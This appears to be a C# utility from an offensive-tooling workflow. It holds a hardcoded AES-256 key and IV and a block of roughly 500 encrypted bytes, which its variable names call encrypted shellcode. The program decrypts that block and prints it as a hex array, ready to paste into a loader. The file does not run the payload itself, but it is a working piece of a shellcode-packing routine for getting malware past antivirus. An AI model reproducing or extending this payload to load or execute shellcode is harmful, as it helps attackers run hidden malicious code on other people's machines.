using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace EncryptDecrypt
{
    class Program
    {
        static void Main(string[] args)
        {

            byte[] Key = Convert.FromBase64String("fRZstgVonk1WpSLeb9ZKcoDkGPzHWDqSAMyTxoopGc8=");
            byte[] IV = Convert.FromBase64String("pyve1rU+58PN/2MWEftieA==");
            byte[] baCipher = new byte[] { 0x29, 0x1d, 0x09, 0xc6, 0xc9, 0xc9, 0xb5, 0x9d, 0xa1, 0x9f, 0x9f, 0x69, 0xfe, 0x44, 0xdc, 0xce, 0x56, 0xb9, 0x4f, 0xe3, 0x15, 0x17, 0x75, 0x26, 0x5f, 0xc9, 0x97, 0x10, 0x44, 0x60, 0x20, 0x33, 0x57, 0xd8, 0xc6, 0xc6, 0x7e, 0xf1, 0x27, 0xdb, 0x0b, 0xa0, 0xcf, 0x36, 0x7c, 0x88, 0x7b, 0x87, 0x79, 0x54, 0x50, 0x6f, 0x05, 0x47, 0xff, 0x62, 0x07, 0xa7, 0x01, 0xbe, 0x3e, 0x6f, 0xbb, 0x63, 0x0b, 0x72, 0x5a, 0x23, 0x31, 0xee, 0xe0, 0x7c, 0x06, 0x05, 0x19, 0xc6, 0x6a, 0x90, 0xc9, 0xae, 0x18, 0xc1, 0x9a, 0xb0, 0xf4, 0x8c, 0x4d, 0xad, 0x68, 0xfc, 0xf6, 0x7f, 0x94, 0xdc, 0x1e, 0xc9, 0xa5, 0xd7, 0xb7, 0x27, 0xe7, 0x2d, 0x16, 0x37, 0xb8, 0x18, 0x0a, 0x4f, 0x32, 0xe1, 0xf6, 0x99, 0x6a, 0x59, 0x58, 0xc4, 0x23, 0x2d, 0xea, 0x9f, 0x36, 0xfc, 0xff, 0x35, 0xfe, 0x77, 0xad, 0x1e, 0x14, 0x8c, 0x91, 0x45, 0x59, 0x4a, 0x04, 0x14, 0xcd, 0x44, 0x10, 0xa0, 0x67, 0x98, 0x68, 0x16, 0xff, 0xbc, 0x0c, 0xfa, 0xcc, 0xc3, 0x6a, 0x13, 0xc2, 0xbb, 0xdf, 0x50, 0x9d, 0x21, 0xb4, 0x4c, 0xed, 0x5e, 0xfe, 0x2b, 0xc7, 0x3b, 0x52, 0x66, 0xbc, 0x9c, 0xd0, 0xa3, 0x9d, 0x15, 0xa0, 0x6c, 0xd6, 0x95, 0x6a, 0x03, 0x89, 0x72, 0x33, 0xdc, 0x16, 0x73, 0x67, 0x12, 0x20, 0xb0, 0xdf, 0x2c, 0x38, 0x59, 0x95, 0xa6, 0x5c, 0x82, 0x17, 0x76, 0x74, 0x0b, 0x93, 0x14, 0x08, 0x6f, 0x5f, 0xc1, 0x7a, 0xa8, 0xd3, 0x16, 0x09, 0x31, 0x0d, 0x5a, 0xda, 0x6e, 0x05, 0xb6, 0x0e, 0x71, 0xa3, 0x3a, 0x03, 0xa7, 0x35, 0xe0, 0x31, 0xd7, 0xc0, 0xb8, 0x68, 0x87, 0xe3, 0xa4, 0xc2, 0xb2, 0xae, 0x52, 0xbc, 0xe5, 0x99, 0xbc, 0xb0, 0xf3, 0xdc, 0x5a, 0x05, 0x85, 0x8b, 0xb2, 0x1b, 0x4c, 0xfd, 0x89, 0xbe, 0x10, 0x4c, 0x7a, 0xc5, 0x60, 0x99, 0x51, 0x98, 0x00, 0xc3, 0x23, 0x77, 0x50, 0x4f, 0xf9, 0x1c, 0x44, 0x11, 0x96, 0x16, 0xf7, 0x77, 0x99, 0xb7, 0x50, 0xdc, 0x5d, 0x83, 0xb1, 0xd4, 0x24, 0x88, 0x9e, 0xac, 0x82, 0x57, 0xc3, 0xdb, 0x3c, 0x22, 0x91, 0x24, 0xdd, 0xe9, 0xd1, 0x49, 0x16, 0x84, 0x15, 0xed, 0xfa, 0x78, 0x70, 0xa4, 0xb3, 0xdc, 0x69, 0x6a, 0x77, 0x2b, 0x19, 0xd3, 0x56, 0x5a, 0x1d, 0xb1, 0x60, 0x33, 0xfe, 0x89, 0x83, 0x00, 0x8d, 0xfd, 0xc0, 0x63, 0xfc, 0x4a, 0x84, 0x36, 0x84, 0xe8, 0x4f, 0xfb, 0x57, 0xe8, 0xea, 0x15, 0x1a, 0x5f, 0x6d, 0x34, 0x75, 0x9e, 0x06, 0x31, 0x79, 0xfa, 0xfb, 0x50, 0x69, 0x3e, 0x70, 0x63, 0x29, 0x4b, 0x01, 0x76, 0xca, 0xae, 0x23, 0x5f, 0xc7, 0x98, 0xc5, 0x17, 0x48, 0x2f, 0x84, 0xbf, 0xa5, 0x69, 0x6b, 0x1b, 0x62, 0x18, 0x1a, 0x25, 0xdb, 0x6d, 0xa2, 0x99, 0x67, 0x86, 0xed, 0x8c, 0xe0, 0xbd, 0x7b, 0x55, 0xff, 0x31, 0x01, 0x12, 0x00, 0x15, 0xb0, 0xaa, 0x47, 0xe5, 0x7b, 0xfe, 0x7c, 0xc7, 0xcb, 0x66, 0xbb, 0x30, 0xdb, 0xd4, 0x26, 0xd6, 0x38, 0x3c, 0x19, 0x27, 0x69, 0x73, 0xa6, 0x3f, 0x36, 0xe8, 0xd8, 0xe2, 0xda, 0x9c, 0x5a, 0x92, 0x1a, 0xcb, 0x8d, 0x44, 0x62, 0x60, 0x12, 0x55, 0x3f, 0xe6, 0xe4, 0x9d, 0x92, 0x24, 0xf1, 0xcb, 0x98, 0xf4, 0xcb, 0xb0, 0xff, 0x93, 0x3c, 0x68, 0xfb, 0xe3, 0x89, 0xfd, 0x0f, 0x29, 0xef, 0xd3, 0xd3, 0xa3, 0x3c, 0xcd, 0xfb, 0x56, 0x88, 0x43, 0x3b, 0x30, 0x16, 0x68, 0xb8, 0x56, 0xb2, 0x55, 0xd7, 0x2b, 0xd7, 0x36, 0x59, 0x81, 0x5d, 0xc6, 0x76, 0x5a, 0x2c, 0x36, 0x01, 0x08, 0xaa, 0x46, 0x67, 0x30, 0x2a, 0xf8, 0xbd, 0xfd, 0x2b, 0x58, 0x58, 0x68, 0xb1, 0x50, 0xea, 0xfd, 0xb5, 0x6f, 0xbe, 0x4f, 0x68, 0x48, 0x95, 0xfd, 0x56, 0x8b, 0xfc, 0x2e, 0x90, 0xfe, 0x92, 0xca, 0x46, 0x17, 0x87, 0x12, 0xdf, 0x41, 0xc8, 0xc1, 0xa7, 0x55, 0x6d, 0x88, 0x57, 0x5b, 0xaf, 0xee, 0x83, 0x54, 0x2d, 0x92, 0xa4, 0x77, 0x61, 0x7b, 0xbb, 0xed, 0x98, 0x91, 0xff, 0xfb, 0x35 };
            byte[] decShell = AESDecryptor(baCipher, Key, IV);
            StringBuilder hex = new StringBuilder(decShell.Length * 2);
            foreach (byte b in decShell)
            {
                hex.AppendFormat("0x{0:x2}, ", b);
            }
            Console.WriteLine(hex.ToString());

        }


        private static byte[] AESDecryptor(byte[] baEncryptedShellCode, byte[] key, byte[] iv)
        {
            using (var aes = Aes.Create())
            {
                aes.KeySize = 256;
                aes.BlockSize = 128;
                aes.Padding = PaddingMode.PKCS7;
                aes.Mode = CipherMode.CBC;
                aes.Key = key;
                aes.IV = iv;

                using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                {
                    return GetDecryptedStream(baEncryptedShellCode, decryptor);
                }
            }
        }
        private static byte[] GetDecryptedStream(byte[] data, ICryptoTransform cryptoTransform)
        {
            using (var ms = new MemoryStream())
            using (var cryptoStream = new CryptoStream(ms, cryptoTransform, CryptoStreamMode.Write))
            {
                cryptoStream.Write(data, 0, data.Length);
                cryptoStream.FlushFinalBlock();

                return ms.ToArray();
            }
        }        
    }
}
